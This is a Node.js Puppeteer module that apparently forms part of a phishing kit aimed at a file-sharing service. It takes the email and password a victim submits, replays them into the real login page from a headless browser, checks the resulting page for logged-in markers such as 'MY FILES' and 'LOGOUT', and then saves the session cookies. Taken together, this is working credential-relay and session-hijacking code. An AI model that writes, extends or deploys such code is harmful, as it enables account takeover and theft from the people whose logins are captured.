const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const email = `[name="login_email"]`
                await page.waitForSelector(email)
                await page.evaluate((email) => {
                    document.querySelector(email).value = ""
                }, email)

                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["MY FILES", "RECENT FILES", "SHARED WITH ME", "TRASH", 'ACCOUNT', 'LOGOUT']
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                const email = `[name="login_email"]`
                const password = `[name="login_pass"]`

                await page.waitForSelector(email)
                await page.waitForSelector(password)
                await page.evaluate((email, password) => {
                    document.querySelector(email).value = ""
                    document.querySelector(password).value = ""
                    document.querySelector(email).setAttribute("value", "")
                    document.querySelector(password).setAttribute("value", "")
                }, email, password)

                await page.type(email, body.login_email)
                await page.type(password, body.login_pass)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }